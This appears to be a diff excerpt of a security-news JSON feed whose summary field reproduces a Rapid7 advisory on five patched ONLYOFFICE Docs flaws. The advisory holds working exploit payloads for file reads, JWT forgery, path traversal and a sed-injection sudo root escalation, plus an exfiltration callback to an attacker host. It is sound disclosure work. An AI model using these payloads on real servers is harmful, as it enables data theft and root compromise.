-      "summary_excerpt": "A critical security flaw in Apache Roller, an open-source, Java-based blogging platform, has come under active exploitation in the wild, according to the Apache Software Foundation (ASF) The vulnerability, tracked as CVE-2026-129448 (CVSS score: 9.8), is a case of unauthenticated deserialization in the XML-RPC endpoint that could lead to remote code execution. \"Deserialization of Untrusted",
-      "threat_actors": [],
-      "title": "Critical Apache Roller RCE Flaw Under Active Exploitation, No Authentication Required"
     }
   ],
   "rising": [],
   "persistent_hot": [
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://www.rapid7.com/blog/post/ve-from-view-only-access-to-container-root-five-vulnerabilities-in-onlyoffice-docs-fixed/",
-      "cves": [
-        "CVE-2026-110385",
-        "CVE-2026-113627",
-        "CVE-2026-113630",
-        "CVE-2026-113631",
-        "CVE-2026-97727"
-      ],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-17T02:23:58.375058+09:00",
-      "heat_score": 54.0,
-      "permalink_id": "article-url-2ffa4640e338a27f78e0d4d9",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:2ffa4640e338a27f78e0d4d9",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        },
-        {
-          "color_family": "red",
-          "key": "ttp",
-          "label": "TTP"
-        },
-        {
-          "color_family": "red",
-          "key": "poc_available",
-          "label": "PoC"
-        }
-      ],
-      "published_at": "2026-11-17T01:24:38+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "Rapid7 Blog",
-      "summary": "Overview As part of our research into Zimbra Collaboration Suite , Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container. The findings also expose server files and document data that the viewer never displays, even when downloading is disabled. CVE Finding CVSS CVE-2026-113627 DocBuilder native file read and Session JWT forgery 7.1 High CVE-2026-110385 DocBuilder SaveFile conversion parameter injection and code execution 8.7 High CVE-2026-97727 Complete-save format path traversal and arbitrary file write 6.5 Medium CVE-2026-113630 Root-helper command injection 7.8 High CVE-2026-113631 View-only export of non-rendered document data 6.5 Medium ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The changelog describes the release's security changes. Proof-of-concept code is available on the accompanying Github repository . Product description ONLYOFFICE Docs provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files. An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving. Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL. Credit This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at Rapid7 . The findings are being disclosed in accordance with Rapid7's vulnerability disclosure policy . Testing setup Rapid7 tested the official onlyoffice/documentserver:9.4.0 image with package onlyoffice-documentserver 9.4.0-129 . DocumentServer ran as the ds account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key. Our analysis of the vendor supplied fixes compares the v9.4.0.129 and v10.0.0.169 tags of ONLYOFFICE/server , ONLYOFFICE/core and ONLYOFFICE/document-server-package . Rapid7 also performed targeted checks on package 10.0.0-169 . For the conditional WOPI test on 9.4.0-129 , Rapid7 enabled only WOPI_ENABLED=true and left the shipped WOPI IP filter unchanged at its default allow-all rule. Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown. Impact View-only document access can lead to command execution as ds and then root inside the official container. The two exploit chains use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry. Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed. Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627) An attacker with view-only access to a document can use /docbuilder to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer. Technical analysis Prerequisite: The attacker needs a valid Editor JWT for any document and access to /docbuilder . Target files must be readable by ds . The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required. The default-secret branch in getTenantSecret() contains: switch (type) { case commonDefines.c_oAscSecretType.Browser: case commonDefines.c_oAscSecretType.Inbox: res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key break; // ... other token types omitted ... } The branch at [0] selects the same configured signing key for Browser and Inbox tokens. builderRequest() passes the request to getRequestParams() : const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation if (authRes.isDecoded) { cmd.setWithAuthorization(true); } At [1] , builderRequest() delegates JWT validation to getRequestParams() . That function's query-token branch checks the signature using the Inbox key: if (tenTokenEnableRequestInbox) { res.code = constants.VKEY; let checkJwtRes; if (res.params.token) { // [2] Inbox signature check checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox); } else { checkJwtRes = yield checkJwtHeader(ctx, req); } // ... remaining validation and decoded-claim handling omitted ... } A view-only Editor JWT passes the signature check at [2] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder. /docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call GetFontBinary() with a supplied filename: std::wstring sFile = file->toStringW(); bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\\\') || std::wstring::npos != sFile.find('/')); if (bIsFullFilePath) { bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check } // ... font-map fallback omitted ... return CJSContext::createUint8Array(sFile); // [4] Return file bytes GetFontBinary() accepts an existing absolute path at [3] and returns its bytes at [4] . Ssani4 previously reported this native file-read behavior in DocumentBuilder issue #147 on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder . ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0 . Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains. Exploitation Reading a server file The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is: POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream builder.CreateFile(\"docx\"); var bytes = native.GetFontBinary(\"/etc/passwd\"); if (bytes === null || typeof bytes === \"undefined\") throw new Error(\"read failed\"); var hex = \"\"; for (var i = 0; i < bytes.length; i++) hex += (\"0\" + bytes[i].toString(16)).slice(-2); var paragraph = Api.CreateParagraph(); paragraph.AddText(\"R7FILE:\" + hex + \":END\"); Api.GetDocument().Push(paragraph); builder.SaveFile(\"docx\", \"stolen.docx\"); builder.CloseFile(); DocumentServer executes the script as ds and returns a URL for stolen.docx . The PoC downloads stolen.docx , extracts the hex between R7FILE: and :END from word/document.xml , and decodes it to recover the contents of /etc/passwd . Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary. Stealing the session signing key The attacker repeats the same request for /etc/onlyoffice/documentserver/local.json . In the tested configuration, services.CoAuthoring.secret.session.string contained the Session JWT signing key. If services.CoAuthoring.secret.session.file instead names a key file, the attacker reads that file with the same GetFontBinary() request. Forging a save credential The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account: { \"document\": { \"key\": \"external-document-20260821\", \"permissions\": { \"download\": true, \"print\": true } }, \"editorConfig\": { \"user\": { \"id\": \"rapid7-poc\", \"index\": 1 } }, \"iat\": 1787329293, \"exp\": 1787329593 } The attacker submits a normal SAVE_TYPE_PART_START request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions. PoC The file-read and JWT-forgery PoC uses a view-only Editor JWT to read /etc/passwd , steal the Session JWT signing key and verify a forged token for an attacker-chosen document key: python3 pocs/editor_token_docbuilder_jwt_forgery.py \\ --documentserver https://docs.example.test \\ --token-file /secure/view-only.jwt \\ --read-file /etc/passwd \\ --read-output /tmp/stolen-passwd \\ --document-key external-document-20260821 \\ --output-token /tmp/forged-session.jwt \\ --timeout 180 Output excerpt: [+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd [+] forged session JWT accepted for document key: external-document-20260821 (save key _7717) [+] forged JWT written to: /tmp/forged-session.jwt [+] forged JWT (expires at Unix time 1787329593): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww The file recovered to the attacker's machine contained the target's account data: $ head -n 5 /tmp/stolen-passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync The JWT printed above was signed with the key recovered from local.json . DocumentServer accepted that signature during the normal save-key reservation: {\"status\":\"ok\",\"data\":\"_7717\"} Impact The attacker can steal any file readable by ds . On the tested system, this included the Session JWT signing key, allowing the attacker to create credentials with document keys and permissions that were never granted to the original viewer. DocumentServer accepted the forged JWT for a save operation under a new document key. The demonstrated unauthorized save accounts for the low integrity impact in the 7.1 High score. The same editor-JWT authorization failure also allowed a view-only user to supply a private-network URL to Api.CreateImage() . DocumentServer fetched the URL and returned a decodable image inside a generated DOCX. This narrower consequence shares the authorization root cause above and is not treated as a separate finding. Fix In 10.0.0-169, builderRequest() now tells the token validator that this is a DocBuilder request: -const authRes = yield docsCoServer.getRequestParams(ctx, req); +authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER); With the default settings, the new check rejects tokens containing document-opening fields such as editorConfig and WOPI fileInfo , even if their signatures are valid. This blocks reuse of a view-only Editor JWT at /docbuilder , as confirmed in the 10.0.0-169 test. The native file-read code also checks supplied paths against the font map in server mode. An unknown path falls back to the default font rather than being read as the requested file. DocBuilder conversion parameter injection enables code execution (CVE-2026-110385) A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by ds . In the tested release, extracting a log4js appender and runtime configuration into the Data directory causes DocService to load and execute attacker code without a restart. Technical analysis Prerequisite: The attacker needs a request accepted by /docbuilder . The destination directory must already exist and be writable by ds . Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition. The DocBuilder text-script dispatcher in CDocBuilder::RunTextA() forwards the optional third builder.SaveFile() argument without restricting it to supported conversion options: const wchar_t* sParams = NULL; if (nCountParameters > 2) sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML // [1] Forward conversion parameters int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams); The third argument at [0] reaches the private save implementation unchanged at [1] . CDocBuilder_Private::SaveFile() XML-encodes its own source and destination paths, but then appends the attacker string as raw XML: oBuilder.WriteString(L\"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?><TaskQueueDataConvert><m_sFileFrom>\"); oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path oBuilder.WriteString(sFileBin + L\"</m_sFileFrom><m_sFileTo>\"); oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path oBuilder.WriteString(L\"</m_sFileTo><m_nFormatTo>\"); oBuilder.WriteString(std::to_wstring(type)); // ... remaining server-generated fields omitted ... if (!sConvertionParams.empty()) { oBuilder.WriteString(sConvertionParams); // [4] Append raw XML } The paths at [2] and [3] are XML-encoded, but the raw XML appended at [4] can introduce duplicate task fields after the server-generated values. X2T's InputParams parser processes elements sequentially and replaces an existing value whenever the same name appears again: else if (_T(\"m_sFileFrom\") == sName) { RELEASEOBJECT(m_sFileFrom); m_sFileFrom = new std::wstring(sValue); // [5] Replace source path } else if (_T(\"m_sFileTo\") == sName) { RELEASEOBJECT(m_sFileTo); m_sFileTo = new std::wstring(sValue); // [6] Replace destination path } else if (_T(\"m_nFormatFrom\") == sName) { RELEASEOBJECT(m_nFormatFrom); m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format } else if (_T(\"m_nFormatTo\") == sName) { RELEASEOBJECT(m_nFormatTo); m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format } Assignments [5] – [8] let later XML elements replace the server-selected paths and formats. getConversionDirection() maps source format 2057 ( AVS_OFFICESTUDIO_FILE_OTHER_ZIP ) and destination format 0 ( AVS_OFFICESTUDIO_FILE_UNKNOWN ) to the directory-extraction operation: else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom && AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo) eRes = TCD_UNZIPDIR; // [9] Directory extraction mode The extraction mode selected at [9] reaches x2t()'s conversion dispatcher , which uses both attacker-selected paths without containment validation: case TCD_UNZIPDIR: { result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive } break; zip2dir() at [10] reads the attacker-selected archive and extracts it into the selected directory writable by ds . Writing DocService's runtime configuration provides a route from this file write to code execution. runtimeConfigManager watches the configuration directory and automatically reloads runtime.json when it is created or changed, passing its attacker-controlled log options to the logger: getConfig(operationContext.global) .then(config => { logger.configureLogger(config?.log?.options); // [11] Reload logging options }) Those options reach configureLogger() at [11] ; the function merges them with the cached configuration before calling log4js: function configureLogger(options) { const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options); log4js.configure(mergedOptions); // [12] Apply log4js configuration } The configuration applied at [12] sets the appender type to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader passes non-core types to require() , executing that module in DocService. Exploitation Preparing the payload files To run id , the inner ZIP named r7-NONCE.zip contains r7-appender-NONCE.js : require(\"child_process\").execFile( \"/bin/sh\", [\"/var/www/onlyoffice/Data/r7-command-NONCE.sh\"] ); exports.configure = () => () => {}; r7-command-NONCE.sh : #!/bin/sh id > /tmp/r7-command-NONCE 2>&1 The shell script is a PoC convenience: execFile() also supports /bin/sh with [\"-c\", \"id > /tmp/r7-command-NONCE 2>&1\"] . Keeping the command in a file lets the root-helper chain reuse it without embedding the command body in the sed expression. And runtime.json : {\"log\":{\"options\":{\"appenders\":{\"default\":{\"type\":\"/var/www/onlyoffice/Data/r7-appender-NONCE.js\"}},\"categories\":{\"default\":{\"appenders\":[\"default\"],\"level\":\"WARN\"}}}}} The attacker places that inner ZIP inside a second ZIP and base64-encodes the outer ZIP. Staging the inner ZIP The attacker submits the outer ZIP in a /docbuilder script. native.SetFilePath() selects /tmp as the native ZIP worker directory, and native.ZipOpenBase64() extracts the inner ZIP as /tmp/nativeZip/r7-NONCE.zip : builder.CreateFile(\"docx\"); native.SetFilePath(\"/tmp/r7-NONCE-placeholder\"); native.ZipOpenBase64(\"BASE64_OUTER_ZIP_CONTAINING_r7-NONCE.zip\"); Extracting outside the job directory The same request calls builder.SaveFile() with duplicate X2T task fields appended as conversion parameters: builder.SaveFile( \"docx\", \"safe.docx\", \"<m_sFileFrom>/tmp/nativeZip/r7-NONCE.zip</m_sFileFrom>\" + \"<m_sFileTo>/var/www/onlyoffice/Data</m_sFileTo>\" + \"<m_nFormatFrom>2057</m_nFormatFrom><m_nFormatTo>0</m_nFormatTo>\" ); builder.CloseFile(); DocumentServer accepts the request and extracts all three files with attacker-controlled names and bytes into /var/www/onlyoffice/Data as ds . Writing runtime.json triggers the watcher, which loads r7-appender-NONCE.js and executes the command in DocService as ds without a restart. PoC Run the DocBuilder PoC with a view-only Editor JWT. The example uses --runtime-absent because the tested installation had no runtime.json : python3 pocs/docbuilder_savefile_params_rce.py \\ --documentserver https://docs.example.test \\ --token-file /secure/view-only.jwt \\ --command id \\ --runtime-absent Output: uid=101(ds) gid=102(ds) groups=102(ds) Impact On the tested release, a user restricted to viewing any document can write files anywhere writable by ds and immediately execute arbitrary JavaScript in DocService. CVE-2026-110385 has a published CVSS v4.0 score of 8.7 High . Fix The 10.0.0-169 SaveFile() implementation filters the supplied conversion parameters before adding them to the X2T task: -sConvertionParams = std::wstring(params); +sConvertionParams = RemoveUnsafeX2tParams(std::wstring(params)); RemoveUnsafeX2tParams() parses the supplied XML and removes m_sFileFrom , m_sFileTo and m_sTempDir . The submitted payload depends on overriding the first two fields to select its archive and extraction destination. Other conversion parameters remain supported. Complete-save format traversal enables arbitrary file write (CVE-2026-97727) An attacker with a valid save session can place path traversal path segments in the requested output format and create or overwrite any file writable by ds on installations using filesystem storage. This file write also enables remote code execution as ds through DocService's runtime logging configuration. Technical analysis Prerequisite: The attacker needs a valid document Session JWT. The installation must use filesystem storage, and the destination must be writable by ds . No victim interaction is required. The Session-token branch of downloadAs() checks save permissions after validating the signature: const doc = checkJwtRes.decoded.document; // [0] Save permission check if (!doc.permissions || false !== doc.permissions.download || false !== doc.permissions.print) { isValidJwt = true; // ... document and user binding omitted ... } else { ctx.logger.warn('Error downloadAs jwt: %s', 'access deny'); } At [0] , the save is denied only when both download and print are explicitly false . An absent permissions object or either absent flag passes this check. commandSave() appends the request's format directly to the filename prefix: const format = cmd.getFormat() || 'bin'; const completeParts = yield* saveParts(ctx, cmd, 'Editor.' + format); // [1] Requested format suffix The suffix at [1] reaches saveParts() unchanged. That function normalizes the filename only for save types other than SAVE_TYPE_COMPLETE_ALL : if (SAVE_TYPE_COMPLETE_ALL !== saveType) { // [2] Conditional filename normalization const ext = pathModule.extname(filename); const saveIndex = parseInt(cmd.getSaveIndex()) || 1; //prevent path traversal filename = pathModule.basename(filename, ext) + saveIndex + ext; } // ... save-key setup omitted ... const buffer = cmd.getData(); // [3] Storage write yield storage.putObject(ctx, cmd.getDocId() + cmd.getSaveKey() + '/' + filename, buffer, buffer.length); For SAVE_TYPE_COMPLETE_ALL , the condition at [2] skips basename normalization, and [3] writes the resulting path. The filesystem backend joins and writes that path without checking that it remains beneath the document root. Exploitation The cmd query parameter on /downloadas/ignored contains URL-encoded JSON. The request fragments below show that JSON decoded separately for readability. Reserving a save key The attacker first sends a normal SAVE_TYPE_PART_START request with their valid Session JWT: POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream reservation The decoded cmd value in that request is: { \"c\": \"save\", \"id\": \"ignored\", \"tokenSession\": \"DOCUMENT_SESSION_JWT\", \"saveindex\": 1, \"outputformat\": 513, \"withoutPassword\": true, \"format\": \"bin\", \"savetype\": 0 } DocumentServer returns a server-generated continuation key: {\"status\":\"ok\",\"data\":\"_5619\"} Writing outside the document directory The attacker sends a second request using that key and SAVE_TYPE_COMPLETE_ALL . Its body contains the bytes to write, while format contains enough parent-directory components to reach the chosen absolute path: POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream ATTACKER_CONTROLLED_FILE_BYTES The decoded cmd value in the second request is: { \"c\": \"save\", \"id\": \"ignored\", \"tokenSession\": \"DOCUMENT_SESSION_JWT\", \"saveindex\": 1, \"outputformat\": 513, \"withoutPassword\": true, \"savekey\": \"_5619\", \"format\": \"/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/onlyoffice/rapid7-write.txt\", \"savetype\": 3 } DocumentServer returns the same continuation key, confirming that it accepted the complete save: {\"status\":\"ok\",\"data\":\"_5619\"} Because SAVE_TYPE_COMPLETE_ALL skips basename normalization, the filesystem backend resolves the traversal and writes the request body to /etc/onlyoffice/rapid7-write.txt as ds . PoC The format-traversal PoC uses a Session JWT to create /etc/onlyoffice/rapid7-write.txt : python3 pocs/downloadas_format_traversal.py \\ --documentserver https://docs.example.test \\ --token-file /secure/document-session.jwt \\ --target-path /etc/onlyoffice/rapid7-write.txt \\ --data 'attacker-controlled configuration write' Output: [*] requesting a server-generated save key [+] reserved save key _5619 [+] traversal request accepted for /etc/onlyoffice/rapid7-write.txt The new file contained the supplied data: $ cat /etc/onlyoffice/rapid7-write.txt attacker-controlled configuration write Testing created a new file rather than overwriting the running configuration. A permission audit found active local.json and default.json files in the same configuration tree writable by ds . Impact The attacker can create or overwrite any file writable by ds . The demonstrated chain uses CVE-2026-113627 to forge a Session JWT, then CVE-2026-97727 to write a JavaScript appender, command script and runtime.json into /var/www/onlyoffice/Data . DocService loads the appender and executes the command as ds . The file-write primitive scores 6.5 Medium . Fix Unlike the 9.4.0-129 implementation , the shared getStoragePath() in 10.0.0-169 checks the normalized object key before handing it to a storage backend: -return opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\\\/g, '/'); +const storagePath = opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\\\/g, '/'); +const normalized = path.posix.normalize(storagePath); +if (normalized !== opt_specialDir && !normalized.startsWith(opt_specialDir + '/')) { + throw new Error('getStoragePath: path escapes storage root'); +} +return storagePath; The check rejects a key that resolves outside the designated storage directory. commandSave() still constructs a filename from format ; the new boundary is in the shared storage layer. In the 10.0.0-169 test, a genuine Session JWT reserved a normal save key, but the traversal request returned HTTP 400 and the target file was absent. Passwordless maintenance command elevates ds to root (CVE-2026-113630) The installed sudo policy lets ds run documentserver-flush-cache.sh as root with unrestricted arguments. The script embeds its --hash argument into a GNU sed expression, allowing code running as ds to execute arbitrary commands as root . Technical analysis Prerequisite: The attacker needs local command execution as ds . The documentserver sudoers file grants ds passwordless root execution of three scripts with unrestricted arguments: Cmnd_Alias DS_ROOT_SCRIPTS = \\ /usr/bin/documentserver-letsencrypt.sh *, \\ /usr/bin/documentserver-generate-allfonts.sh *, \\ /usr/bin/documentserver-flush-cache.sh * # [0] Unrestricted helper arguments ds ALL=(root) NOPASSWD: DS_ROOT_SCRIPTS # [1] Passwordless root execution At [0] , the * permits ds to choose every argument supplied to documentserver-flush-cache.sh . At [1] , sudo executes that script as root without asking for a password. documentserver-flush-cache.sh assigns the complete --hash argument to HASH and interpolates it directly into a sed program: while [ \"$1\" != \"\" ]; do case $1 in -h | --hash ) if [ \"$2\" != \"\" ]; then HASH=$2 # [2] Unchecked hash argument shift fi ;; # ... restart option omitted ... esac shift done API_PATH=\"/var/www/M4_DS_PREFIX/web-apps/apps/api/documents/api.js\" cp -f ${API_PATH}.tpl ${API_PATH} sed -i \"s/{{HASH_POSTFIX}}/${HASH}/g\" ${API_PATH} # [3] Sed interpolation At [2] , the script applies no character allowlist or length constraint. At [3] , the attacker controls sed replacement text, delimiters, flags, and additional commands in the sed program. Because sudo has already changed the effective UID, GNU sed and every command reached through its e flag run as root . The packaged api.js.tpl contains a matching line: const ver = '/9.4.0-{{HASH_POSTFIX}}'; // [4] Sed match target The attacker supplies this --hash value: ';id > \\/tmp\\/r7-root;#'/e;# The interpolation at [3] produces this sed expression: s/{{HASH_POSTFIX}}/';id > \\/tmp\\/r7-root;#'/e;#/g The injected / ends the replacement early, making e a shell-execution flag . The final ;# comments out the helper's appended /g . After substitution, the template line at [4] becomes: const ver = '/9.4.0-';id > /tmp/r7-root;#''; The e flag sends this whole line to /bin/sh . The shell tries to run const , which fails, but the semicolon still starts id . Its output is written to /tmp/r7-root , and # comments out the trailing quotes. Because sudo launched the helper as root , id also runs as root . Exploitation From a process running as ds , the attacker supplies a sed expression that terminates the intended replacement, executes a command, and comments out the rest. For the view-only remote chain, the SaveFile stage writes a command script into /var/www/onlyoffice/Data . The loaded appender invokes /usr/bin/sudo with an argument array, placing /bin/sh /var/www/onlyoffice/Data/r7-command-NONCE.sh in the same sed payload. The helper executes that script as root , and the PoC makes additional /docbuilder requests to read its output. PoC Run the helper as ds , then read the result: sudo /usr/bin/documentserver-flush-cache.sh \\ --hash \"';id > \\/tmp\\/r7-root;#'/e;#\" \\ --restart false cat /tmp/r7-root uid=0(root) gid=0(root) groups=0(root) The DocBuilder chain invokes this helper remotely through the SaveFile finding. Impact An attacker who compromises DocumentServer's ds process can cross the operating-system privilege boundary and execute as root inside the official container. This scores 7.8 High . The tested container lacked a Docker socket, and ds had no effective Linux capabilities. Fix The 10.0.0-169 cache-flush script validates HASH before inserting it into the sed expression: +case \"$HASH\" in + '') ;; + *[!A-Za-z0-9._-]*) + echo \"documentserver-flush-cache: invalid --hash value '${HASH}': only [A-Za-z0-9._-] characters are allowed\" >&2 + exit 1 + ;; +esac The new check rejects characters needed for the sed injection, including / , ; and ' . The helper was also renamed to documentserver-flush-cache ; the 10.0 sudoers file still allows ds to run it as root without a password. View-only sendForm exports non-rendered document data (CVE-2026-113631) A viewer can reconnect with a valid Session JWT while replacing the callback URL from the signed opening configuration. Because sendForm remains available in view mode, DocumentServer reconstructs the document and sends it to the attacker even when download and form-filling are disabled. Technical analysis Prerequisite: The attacker must be authorized to view the target DOCX and connect normally once to receive its Session JWT. DocumentServer must be able to reach the attacker's replacement callback. To disclose more than the viewer displays, the document must contain non-rendered data. No edit, download, copy, print, or form-filling permission is required. A view-only editor connection receives a server-issued Session JWT for reconnection. fillJwtByConnection() constructs its payload as follows: const edit = payload.editorConfig; //todo //edit.callbackUrl = callbackUrl; // [0] Callback assignment disabled // ... remaining session fields omitted ... return yield signToken(ctx, payload, tenTokenSessionAlgorithm, tenTokenSessionExpires / 1000, commonDefines.c_oAscSecretType.Session); The commented-out assignment at [0] leaves the original callback URL out of the signed reconnect state. A reconnecting viewer can replace it; after host filtering, DocumentServer stores the replacement as that viewer's callback. Message authorization and dispatch in DocsCoServer.js include: // [1] Restricted viewer messages if ( (conn.isCloseCoAuthoring || (conn.user && conn.user.view)) && ('getLock' == data.type || 'saveChanges' == data.type || 'isSaveLock' == data.type) ) { // ... denial omitted ... } // ... other message types omitted ... case 'rpc': yield* startRPC(ctx, conn, data.responseKey, data.data); // [2] RPC dispatch break; The view-mode restriction at [1] omits rpc , allowing dispatch to startRPC() at [2] . The sendForm branch checks only that conn.user exists; it does not require edit, download, print, form-filling, or export permission. commandSfcCallback() then sends the reconstructed document to the viewer's replacement callback The callback request also bypasses the normal private-address filter under the tested defaults. sendServerRequest() marks the URL as JWT-trusted whenever Inbox JWT validation is enabled, even though the replacement URL was not signed. The HTTP request helper consequently permits a direct request without the private-address filter. Exploitation Figure 1: View-only document export through a replaced callback. Obtaining a session JWT The attacker opens the target DOCX normally with their view-only Editor JWT. The relevant fields in the Socket.IO authentication message retain mode=view and download=false : { \"type\": \"auth\", \"docid\": \"TARGET_DOCUMENT_KEY\", \"documentCallbackUrl\": \"SIGNED_INTEGRATOR_CALLBACK\", \"mode\": \"view\", \"permissions\": { \"download\": false }, \"jwtOpen\": \"VIEW_ONLY_EDITOR_JWT\", \"jwtSession\": null } DocumentServer accepts the view-only connection and returns a server-issued Session JWT in its auth message. Replacing the callback The attacker opens a second Socket.IO connection and authenticates with that Session JWT, but substitutes their own URL for documentCallbackUrl . The relevant changed fields are: { \"type\": \"auth\", \"docid\": \"TARGET_DOCUMENT_KEY\", \"documentCallbackUrl\": \"https://attacker.example.test/operator-callback\", \"mode\": \"view\", \"jwtOpen\": null, \"jwtSession\": \"SERVER_SESSION_JWT\" } The session remains view-only, but DocumentServer stores the attacker's callback because the Session JWT does not bind the original callback URL. The attacker controls its host, port, path and query string. Forcing document export Over the reconnected socket, the attacker invokes sendForm directly: { \"type\": \"rpc\", \"responseKey\": \"ATTACKER_RESPONSE_KEY\", \"data\": { \"type\": \"sendForm\", \"formdata\": { \"formsdata\": [] } } } The server returns RPC code 0 , reconstructs a DOCX, and sends a status 6 callback containing its download URL to the attacker: { \"key\": \"TARGET_DOCUMENT_KEY\", \"status\": 6, \"url\": \"DOCUMENTSERVER_OUTPUT_URL\" } The attacker downloads that URL. Rapid7 demonstrated the attack with edit , download , print , review , comment , fillForms , copy , and chat set to false . The exported DOCX retained content that the viewer had not displayed: DOCX part Content available to the attacker customXml/item1.xml Custom XML stored alongside the document body docProps/custom.xml Custom document-property values word/document.xml A field's instruction text ( w:instrText ), separate from its displayed result DocumentServer regenerates the DOCX during export. Figure 2: Restricted document view. Figure 3: Hidden data exposed by the export. PoC The viewer-export PoC opens the document, replaces the callback and downloads the export. This example uses an HTTPS reverse proxy that terminates TLS on port 443 and forwards the /operator-callback/ subtree to the PoC's HTTP listener on port 18085, preserving the generated per-run path suffix. python3 pocs/viewer_sendform_download_bypass.py \\ --documentserver https://docs.example.test \\ --token-file /secure/restrictive-view.jwt \\ --callback-url https://attacker.example.test/operator-callback \\ --listen-port 18085 \\ --output reconstructed.docx Output: [*] opening document with the view-only token [+] view-only session established; server session JWT received [*] reconnecting with the attacker callback [+] replacement callback accepted for the view-only session [*] invoking rpc/sendForm [+] attacker callback received status 6 [+] saved 27306 bytes to reconstructed.docx [+] view-only document export reproduced Impact A user denied download can recover a reconstructed DOCX retaining data that the viewer never displayed, potentially including confidential metadata and OOXML content. This scores 6.5 Medium . Callback replacement also enables blind HTTP POST SSRF. Rapid7 confirmed delivery to a controlled RFC1918 destination. The source also permits loopback destinations under these defaults; in Docker, localhost refers to the DocumentServer container. DocumentServer sends its JSON status callback, and the viewer cannot read the target's response body. Fix The 